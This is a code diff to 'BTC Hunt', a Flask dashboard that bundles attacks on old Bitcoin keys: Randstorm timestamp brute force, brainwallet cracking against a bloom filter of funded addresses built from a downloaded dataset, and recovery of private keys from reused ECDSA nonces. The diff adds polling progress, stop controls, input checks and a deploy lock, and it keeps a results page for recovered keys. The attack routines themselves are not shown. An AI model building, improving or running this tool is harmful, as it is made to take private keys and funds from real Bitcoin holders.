@@ -6,13 +6,13 @@ BTC Hunt — all viable pre-2015 Bitcoin attacks in one deployable app.
   2. Brainwallet (SHA256 passphrase)            — wordlist → address
   3. Nonce Reuse (ECDSA, P2PKH/P2WPKH)         — Esplora API → algebra
 
-Dashboard: Flask + SSE progress. Persistent disk at /data.
+Dashboard: Flask + short JSON progress polls. Persistent disk at /data.
 Dataset: auto-download from addresses.loyce.club, fallback 3xpl.com.
 
 Deploy: gunicorn btc_hunt:app --bind 0.0.0.0:$PORT --timeout 180
 """
 
-import os, sys, io, re, csv, gzip, json, math, time, signal, base64, hmac
+import os, sys, io, re, csv, gzip, json, math, time, signal, base64, hmac, html
 import sqlite3, threading, hashlib, struct, argparse
 from pathlib import Path
 from datetime import datetime, timezone
@@ -34,6 +34,16 @@ DB_PATH    = DATA_DIR / "btc_hunt.sqlite"
 BLOOM_PATH = DATA_DIR / "funded.bloom"
 ADDR_GZ    = DATA_DIR / "blockchair.tsv.gz"
 RESULTS    = DATA_DIR / "results.json"
+
+# Written while one or more in-memory jobs are running. btc-hunt-update checks
+# this file and defers a redeploy instead of restarting the service (which
+# would kill the job). Removed at import time in case a previous process died
+# without cleaning up.
+BUSY_FILE  = DATA_DIR / ".btc-hunt-busy"
+try:
+    BUSY_FILE.unlink(missing_ok=True)
+except OSError:
+    pass
 
 # Prefer HTTPS: some cloud networks drop plain-HTTP egress. The original
 # mirrors stay as fallbacks.
@@ -270,13 +280,16 @@ class BloomFilter:
 # ════════════════════════════════════════════════════════════════════
 # DATASET
 # ════════════════════════════════════════════════════════════════════
-def _download(url, dest, log):
+def _download(url, dest, log, progress=None):
     # Stream into a .part file so a failed 1.5 GB transfer never leaves a
     # truncated dataset that later looks "already downloaded".
     log(f"[dl] {url}")
     tmp = Path(str(dest) + ".part")
     try:
-        r = requests.get(url, stream=True, timeout=60)
+        # Some mirrors reject the default python-requests User-Agent.
+        r = requests.get(url, stream=True, timeout=(15, 60),
+                         headers={"User-Agent":
+                                  "Mozilla/5.0 (compatible; btc-hunt/1.0)"})
         r.raise_for_status()
         total = int(r.headers.get('content-length', 0))
         done = 0; last = 0
@@ -286,24 +299,39 @@ def _download(url, dest, log):
                 if total and done - last > 50 << 20:
                     last = done
                     log(f"[dl] {done/1e9:.2f}/{total/1e9:.2f} GB")
+                    if progress:
+                        progress(0.05 + 0.20 * min(done / total, 1.0),
+                                 f"downloading {done/1e9:.2f}/{total/1e9:.2f} GB")
+        if not done:
+            raise RuntimeError("mirror returned an empty response")
         tmp.replace(dest)
         log(f"[✓] downloaded {done/1e9:.2f} GB")
+        if progress:
+            progress(0.25, "download complete")
         return True
     except Exception as e:
         log(f"[!] {url}: {e}")
         tmp.unlink(missing_ok=True)
         return False
 
-def build_bloom(log):
+
+def build_bloom(log, progress=None):
     # Two streaming passes over the gzip: pass 1 sizes the bloom from the row
     # count, pass 2 fills it directly. Holding every hash160 in a Python set
-    # needs several GB and gets OOM-killed on a small Render instance.
+    # needs several GB and gets OOM-killed on a small instance.
+    def report(frac, detail):
+        if progress:
+            progress(frac, detail)
+
     if not ADDR_GZ.exists():
+        report(0.02, "downloading dataset")
         ok = False
         for u in DATASET_URLS:
-            if _download(u, ADDR_GZ, log): ok = True; break
+            if _download(u, ADDR_GZ, log, progress): ok = True; break
         if not ok:
             raise RuntimeError("all dataset mirrors failed")
+    else:
+        report(0.25, "dataset already downloaded")
 
     def hashes():
         with gzip.open(ADDR_GZ, 'rt', errors='ignore') as f:
@@ -315,19 +343,32 @@ def build_bloom(log):
                     yield h
 
     log("[parse] pass 1/2 — counting address rows")
-    n = sum(1 for _ in hashes())
+    report(0.30, "pass 1/2 — counting address rows")
+    n = 0
+    for _ in hashes():
+        n += 1
+        if n % 1000000 == 0:
+            log(f"[parse] pass 1 — {n/1e6:.1f}M rows counted")
+            report(0.30 + 0.05 * min(n / 100_000_000, 1.0),
+                   f"pass 1/2 — {n/1e6:.1f}M rows counted")
     log(f"[parse] {n:,} rows — sizing bloom")
-    bf = BloomFilter.create(n or 1, fp_rate=0.001)
+    if not n:
+        raise RuntimeError("dataset contains no usable addresses")
+    bf = BloomFilter.create(n, fp_rate=0.001)
 
     log(f"[parse] pass 2/2 — filling bloom ({bf.m/8/1e6:.0f} MB bitset, k={bf.k})")
+    report(0.35, "pass 2/2 — filling bloom")
     i = 0
     for h in hashes():
         bf.add(h); i += 1
         if i % 500000 == 0:
             log(f"[parse] {i/1e6:.1f}M/{n/1e6:.1f}M addresses")
+            report(0.35 + 0.60 * min(i / n, 1.0),
+                   f"pass 2/2 — {i/1e6:.1f}M/{n/1e6:.1f}M addresses")
     bf.save(BLOOM_PATH)
     log(f"[✓] bloom saved ({BLOOM_PATH.stat().st_size/1e6:.0f} MB, "
         f"{bf.m/8/1e6:.0f} MB bitset, k={bf.k})")
+    report(1.0, f"done — {n/1e6:.1f}M addresses indexed")
     return bf
 
 def _address_to_hash160(addr):
@@ -651,27 +692,53 @@ def _list_results():
                 for a, p, t in c.execute(
                     "SELECT attack,payload,ts FROM results ORDER BY id DESC LIMIT 500")]
 
+def _sync_busy():
+    """Keep the deploy marker in sync with the set of live jobs."""
+    try:
+        with _JOBS_LOCK:
+            alive = sorted(n for n, j in _JOBS.items() if j["alive"])
+        if alive:
+            BUSY_FILE.write_text(",".join(alive), encoding="utf-8")
+        else:
+            BUSY_FILE.unlink(missing_ok=True)
+    except OSError:
+        pass
+
+
 def _start_job(name, fn, *args):
     with _JOBS_LOCK:
         if name in _JOBS and _JOBS[name]["alive"]:
             return False, "job already running"
-        job = {"progress": 0, "detail": "", "alive": True, "stop": False,
-               "log": [], "started": datetime.now(timezone.utc).isoformat()}
+        job = {"progress": 0.0, "detail": "starting…", "alive": True,
+               "stop": False, "log": [], "log_total": 0, "error": "",
+               "started": datetime.now(timezone.utc).isoformat()}
         _JOBS[name] = job
+    _sync_busy()
 
     def log(msg):
-        job["log"].append(msg)
-        if len(job["log"]) > 500: job["log"] = job["log"][-500:]
+        # The log list is capped, but log_total is monotonic so clients can
+        # ask for "everything since N" without losing their place.
+        with _JOBS_LOCK:
+            job["log"].append(msg)
+            job["log_total"] += 1
+            if len(job["log"]) > 500:
+                del job["log"][:-500]
         print(f"[{name}] {msg}", flush=True)
 
     def runner():
         try:
             fn(*args, job=job, log=log)
         except Exception as e:
+            job["error"] = str(e)
             log(f"[!] {name} crashed: {e}")
         finally:
             job["alive"] = False
-            job["progress"] = 1.0
+            if job["error"]:
+                job["detail"] = f"failed: {job['error']}"
+            else:
+                job["progress"] = 1.0
+                job["detail"] = job["detail"] or "done"
+            _sync_busy()
 
     threading.Thread(target=runner, daemon=True).start()
     return True, "started"
@@ -739,13 +806,71 @@ max-height:320px;font-size:12px;border:1px solid #3b4252}
 .muted{color:#7b8794;font-size:13px}
 .status-ok{color:#a3be8c}.status-bad{color:#bf616a}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:12px}
+.msg{padding:10px;border-radius:4px;margin:10px 0;font-size:13px}
+.msg:empty{display:none}
+.msg.ok{background:#2e3b2b;color:#a3be8c;border:1px solid #a3be8c}
+.msg.err{background:#3b2629;color:#bf616a;border:1px solid #bf616a}
 </style></head><body>
 <h1>₿ BTC Hunt — pre-2015 attack dashboard</h1>
 <p><a href="/">home</a><a href="/data">dataset</a>
 <a href="/randstorm">randstorm</a><a href="/brain">brainwallet</a>
 <a href="/nonce">nonce reuse</a><a href="/results">results</a></p>
 <hr style="border-color:#3b4252;margin:14px 0">
+<div id="msg" class="msg"></div>
 {body}
+<script>
+// Short JSON polls instead of long-lived SSE streams. SSE generators used to
+// loop forever and exhaust Gunicorn's worker threads, which made the whole
+// dashboard appear frozen after a few tabs were opened.
+function notify(text, ok){
+  const m=document.getElementById('msg');
+  if(!m)return;
+  m.textContent=text||'';
+  m.className='msg '+(text?(ok?'ok':'err'):'');
+}
+function post(url, body){
+  const init={method:'POST',cache:'no-store',headers:{'Content-Type':'application/json'}};
+  if(body!==undefined) init.body=JSON.stringify(body);
+  return fetch(url,init)
+    .then(r=>{
+      if(!r.ok) throw new Error('HTTP '+r.status+
+        (r.status===401?' (login expired — reload this page)':''));
+      return r.json();
+    })
+    .then(d=>{ notify(d.msg||(d.ok?'started':'failed'), !!d.ok); return d; })
+    .catch(e=>{ notify('Request failed: '+e.message,false); return {ok:false,msg:e.message}; });
+}
+function stop(name){ post('/api/stop/'+encodeURIComponent(name), {}); }
+function watch(name){
+  let since=0, lines=[], delay=1000;
+  const NL=String.fromCharCode(10);
+  const bar=document.getElementById('bar'),
+        detail=document.getElementById('detail'),
+        log=document.getElementById('log');
+  function tick(){
+    fetch('/api/job/'+encodeURIComponent(name)+'?since='+since,{cache:'no-store'})
+      .then(r=>{ if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
+      .then(d=>{
+        since=d.log_len||0;
+        if(d.log && d.log.length){
+          lines=lines.concat(d.log);
+          if(lines.length>300) lines=lines.slice(-300);
+          if(log){ log.textContent=lines.join(NL); log.scrollTop=log.scrollHeight; }
+        }
+        if(bar) bar.style.width=(Math.min(1,Math.max(0,d.progress||0))*100).toFixed(1)+'%';
+        if(detail){
+          detail.textContent=d.error ? 'ERROR: '+d.error :
+                             (d.detail || (d.alive?'running…':'not started'));
+          detail.className=d.error?'status-bad':'muted';
+        }
+        delay=(d.alive||d.exists)?1000:3000;
+      })
+      .catch(e=>{ if(detail) detail.textContent='status unavailable: '+e.message; delay=3000; })
+      .finally(()=>setTimeout(tick,delay));
+  }
+  tick();
+}
+</script>
 </body></html>
 """
 
@@ -793,23 +918,31 @@ def data_page():
 else '✗ not downloaded'}</p>
 <p>funded.bloom: {'✓ ' + f'{status["bloom_size"]/1e6:.0f} MB' if status['bloom']
 else '✗ not built'}</p>
-<button class="btn" onclick="fetch('/api/dataset',{{method:'POST'}})
-.then(r=>r.json()).then(d=>alert(d.msg))">Download & build bloom</button>
+<button class="btn" onclick="post('/api/dataset')">Download &amp; build bloom</button>
+<button class="btn danger" onclick="stop('dataset')">Stop</button>
+<p class="muted">Downloads ~1.5 GB from public mirrors, then two streaming passes
+build the bloom filter. This takes a while — progress and the live log are below.</p>
 </div>
-<div class="card"><h2>Log</h2><pre id="log"></pre></div>
-<script>
-const es = new EventSource('/api/log/dataset');
-es.onmessage = e => {{ document.getElementById('log').textContent += e.data+'\n'; }};
-</script>"""
+<div class="card"><h2>Progress</h2>
+<div class="bar"><div id="bar" style="width:0%"></div></div>
+<p id="detail" class="muted">not started</p><pre id="log"></pre>
+</div>
+<script>watch('dataset');</script>"""
     return page(body)
 
 @app.route("/api/dataset", methods=["POST"])
 def api_dataset():
     def runner(job, log):
+        def progress(frac, detail):
+            job["progress"] = max(0.0, min(1.0, frac))
+            job["detail"] = detail
         try:
-            build_bloom(log)
+            build_bloom(log, progress)
             job["progress"] = 1.0
+            job["detail"] = "done — bloom filter ready"
+            log("[✓] dataset ready")
         except Exception as e:
+            job["error"] = str(e)
             log(f"[!] {e}")
     ok, msg = _start_job("dataset", runner)
     return {"ok": ok, "msg": msg}
@@ -821,10 +954,12 @@ def rs_page():
 <label>Start (ms since epoch)</label>
 <input id="s" value="1293840000000">
 <label>End (ms since epoch)</label>
-<input id="e" value="1420070400000">
-<p class="muted">2011-01-01 → 2015-01-01 is the vulnerable window.
-Each ms = one candidate key.</p>
+<input id="e" value="1293840001000">
+<p class="muted">2011-01-01 → 2015-01-01 is the vulnerable window, but that is
+126 billion timestamps and would take months. The default here is a 1,000 ms
+smoke test; raise it in small chunks (max 5,000,000 ms per run).</p>
 <button class="btn" onclick="start()">Start</button>
+<button class="btn danger" onclick="stop('randstorm')">Stop</button>
 </div>
 <div class="card"><h2>Progress</h2>
 <div class="bar"><div id="bar" style="width:0%"></div></div>
@@ -832,30 +967,34 @@ Each ms = one candidate key.</p>
 </div>
 <script>
 function start(){
-  const s=document.getElementById('s').value, e=document.getElementById('e').value;
-  fetch('/api/randstorm',{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({start:parseInt(s),end:parseInt(e)})})
-  .then(r=>r.json()).then(d=>console.log(d));
+  const s=parseInt(document.getElementById('s').value,10),
+        e=parseInt(document.getElementById('e').value,10);
+  post('/api/randstorm',{start:s,end:e});
 }
-const es=new EventSource('/api/job/randstorm');
-es.onmessage=e=>{
-  const d=JSON.parse(e.data);
-  document.getElementById('bar').style.width=(d.progress*100)+'%';
-  document.getElementById('detail').textContent=d.detail;
-  if(d.log && d.log.length) document.getElementById('log').textContent=
-    d.log.slice(-50).join('\\n');
-};
+watch('randstorm');
 </script>"""
     return page(body)
 
 @app.route("/api/randstorm", methods=["POST"])
 def api_rs():
     if not BLOOM_PATH.exists():
-        return {"ok": False, "msg": "bloom not built"}
-    bf = BloomFilter.load(BLOOM_PATH)
-    j = request.get_json()
-    ok, msg = _start_job("randstorm", attack_randstorm,
-                          int(j["start"]), int(j["end"]), bf)
+        return {"ok": False,
+                "msg": "bloom not built — build it on the /data page first"}
+    j = request.get_json(silent=True) or {}
+    try:
+        start, end = int(j["start"]), int(j["end"])
+    except (KeyError, TypeError, ValueError):
+        return {"ok": False, "msg": "start and end must be integer ms timestamps"}
+    if end < start:
+        return {"ok": False, "msg": "end must be >= start"}
+    if end - start + 1 > 5_000_000:
+        return {"ok": False,
+                "msg": "range too large (max 5,000,000 ms per run) — split it up"}
+    try:
+        bf = BloomFilter.load(BLOOM_PATH)
+    except Exception as e:
+        return {"ok": False, "msg": f"cannot load bloom filter: {e}"}
+    ok, msg = _start_job("randstorm", attack_randstorm, start, end, bf)
     return {"ok": ok, "msg": msg}
 
 @app.route("/brain")
@@ -865,6 +1004,7 @@ def brain_page():
 <label>Upload .txt (one passphrase per line)</label>
 <input type="file" id="f" accept=".txt">
 <button class="btn" onclick="start()">Start</button>
+<button class="btn danger" onclick="stop('brainwallet')">Stop</button>
 <p class="muted">Try rockyou.txt, common English phrases, or
 custom lists. Max ~130k pw/s against bloom.</p>
 </div>
@@ -878,32 +1018,27 @@ function start(){
   if(!file){alert('pick a file');return}
   const reader=new FileReader();
   reader.onload=()=>{
-    fetch('/api/brain',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({data:reader.result})})
-    .then(r=>r.json()).then(d=>console.log(d));
+    post('/api/brain',{data:reader.result});
   };
   reader.readAsText(file);
 }
-const es=new EventSource('/api/job/brainwallet');
-es.onmessage=e=>{
-  const d=JSON.parse(e.data);
-  document.getElementById('bar').style.width=(d.progress*100)+'%';
-  document.getElementById('detail').textContent=d.detail;
-  if(d.log && d.log.length) document.getElementById('log').textContent=
-    d.log.slice(-50).join('\\n');
-};
+watch('brainwallet');
 </script>"""
     return page(body)
 
 @app.route("/api/brain", methods=["POST"])
 def api_brain():
     if not BLOOM_PATH.exists():
-        return {"ok": False, "msg": "bloom not built"}
-    bf = BloomFilter.load(BLOOM_PATH)
-    lines = [ln.strip() for ln in (request.get_json().get("data") or "").splitlines()
-             if ln.strip()]
+        return {"ok": False,
+                "msg": "bloom not built — build it on the /data page first"}
+    j = request.get_json(silent=True) or {}
+    lines = [ln.strip() for ln in (j.get("data") or "").splitlines() if ln.strip()]
     if not lines:
-        return {"ok": False, "msg": "empty file"}
+        return {"ok": False, "msg": "no passphrases (pick a .txt file first)"}
+    try:
+        bf = BloomFilter.load(BLOOM_PATH)
+    except Exception as e:
+        return {"ok": False, "msg": f"cannot load bloom filter: {e}"}
     ok, msg = _start_job("brainwallet", attack_brainwallet, lines, bf)
     return {"ok": ok, "msg": msg}
 
@@ -914,6 +1049,7 @@ def nonce_page():
 <label>Bitcoin address</label>
 <input id="a" placeholder="1... or bc1...">
 <button class="btn" onclick="start()">Scan</button>
+<button class="btn danger" onclick="stop('nonce')">Stop</button>
 <p class="muted">Fetches all txs via Blockstream Esplora, finds
 repeated r values, recovers the private key.</p>
 </div>
@@ -923,24 +1059,19 @@ repeated r values, recovers the private key.</p>
 <script>
 function start(){
   const a=document.getElementById('a').value.trim();
-  fetch('/api/nonce',{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({address:a})})
-  .then(r=>r.json()).then(d=>console.log(d));
+  post('/api/nonce',{address:a});
 }
-const es=new EventSource('/api/job/nonce');
-es.onmessage=e=>{
-  const d=JSON.parse(e.data);
-  document.getElementById('detail').textContent=d.detail;
-  if(d.log && d.log.length) document.getElementById('log').textContent=
-    d.log.slice(-80).join('\\n');
-};
+watch('nonce');
 </script>"""
     return page(body)
 
 @app.route("/api/nonce", methods=["POST"])
 def api_nonce():
-    addr = (request.get_json().get("address") or "").strip()
-    if not addr: return {"ok": False, "msg": "no address"}
+    j = request.get_json(silent=True) or {}
+    addr = (j.get("address") or "").strip()
+    if not addr: return {"ok": False, "msg": "enter a Bitcoin address first"}
+    if not re.fullmatch(r"[1-9A-HJ-NP-Za-km-z]{2,90}", addr):
+        return {"ok": False, "msg": "that does not look like a Bitcoin address"}
     ok, msg = _start_job("nonce", attack_nonce_reuse, addr)
     return {"ok": ok, "msg": msg}
 
@@ -951,33 +1082,58 @@ def results_page():
     if not rows:
         body += "<p class='muted'>no hits yet</p>"
     for r in rows:
-        body += f"<div class='card'><p class='hit'>[{r['attack']}] {r['ts']}</p>" \
-                f"<pre>{json.dumps(r['payload'], indent=2)}</pre></div>"
+        # Hit payloads can contain user-supplied passphrases: escape before
+        # inserting into HTML, otherwise a stored XSS is possible.
+        body += (f"<div class='card'><p class='hit'>[{html.escape(str(r['attack']))}] "
+                 f"{html.escape(str(r['ts']))}</p>"
+                 f"<pre>{html.escape(json.dumps(r['payload'], indent=2))}</pre></div>")
     body += "</div>"
     return page(body)
 
 @app.route("/api/job/<name>")
-def api_job_stream(name):
-    def gen():
-        last_log_len = 0
-        while True:
-            job = _JOBS.get(name)
-            if not job:
-                yield f"data: {json.dumps({'progress':0,'detail':'not started','log':[]})}\n\n"
-                time.sleep(1); continue
-            payload = {"progress": job["progress"], "detail": job["detail"],
-                       "alive": job["alive"], "log": job["log"][last_log_len:]}
-            last_log_len = len(job["log"])
-            yield f"data: {json.dumps(payload)}\n\n"
-            if not job["alive"] and last_log_len == len(job["log"]):
-                yield f"data: {json.dumps({'progress':1,'detail':'done','alive':False,'log':[]})}\n\n"
-                break
-            time.sleep(0.5)
-    return Response(gen(), mimetype="text/event-stream")
+def api_job_status(name):
+    """Short, cache-free JSON snapshot. Clients poll with ?since=<log_total>.
+
+    Replaces the old text/event-stream generator, which never terminated when
+    idle and therefore held one Gunicorn thread open per browser tab forever.
+    """
+    with _JOBS_LOCK:
+        job = _JOBS.get(name)
+        if job is None:
+            payload = {"exists": False, "alive": False, "progress": 0.0,
+                       "detail": "not started", "error": "", "log": [],
+                       "log_len": 0}
+        else:
+            total = job["log_total"]
+            try:
+                since = int(request.args.get("since", 0) or 0)
+            except ValueError:
+                since = 0
+            since = max(0, min(since, total))
+            n_new = min(total - since, len(job["log"]))
+            new = job["log"][-n_new:] if n_new > 0 else []
+            payload = {"exists": True, "alive": job["alive"],
+                       "progress": job["progress"], "detail": job["detail"],
+                       "error": job["error"], "log": new, "log_len": total,
+                       "started": job["started"]}
+    return Response(json.dumps(payload), mimetype="application/json",
+                    headers={"Cache-Control": "no-store, max-age=0"})
+
 
 @app.route("/api/log/<name>")
-def api_log_stream(name):
-    return api_job_stream(name)
+def api_log_status(name):
+    return api_job_status(name)
+
+
+@app.route("/api/stop/<name>", methods=["POST"])
+def api_stop(name):
+    with _JOBS_LOCK:
+        job = _JOBS.get(name)
+        if not job or not job["alive"]:
+            return {"ok": False, "msg": "no running job"}
+        job["stop"] = True
+        job["detail"] = "stopping…"
+    return {"ok": True, "msg": "stop requested"}
 
 
 # ════════════════════════════════════════════════════════════════════
